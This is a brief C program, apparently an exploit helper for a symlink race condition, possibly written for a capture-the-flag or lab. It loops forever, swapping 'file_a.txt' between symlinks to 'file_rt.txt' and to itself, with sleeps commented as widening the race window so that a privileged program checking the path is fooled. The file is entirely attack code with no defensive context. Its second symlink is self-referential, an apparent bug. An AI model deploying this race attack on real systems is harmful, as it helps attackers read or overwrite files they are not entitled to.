#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <errno.h>

int main(void){
  const char *link = "file_a.txt";
  const char *file_a = "file_a.txt";
  const char *file_rt  = "file_rt.txt";

  // loop toggling between file_a and file_rt via symlink replacement
  while(1){
    // make it point to file_rt
    unlink(link);
    if (symlink(file_rt, link) < 0) { perror("symlink file_rt"); }
    // short sleep to widen race window
    usleep(200);

    // make it point to file_a (or replace with actual regular file)
    unlink(link);
    if (symlink(file_a, link) < 0) { perror("symlink file_a"); }
    usleep(200);
  }
  return 0;
}


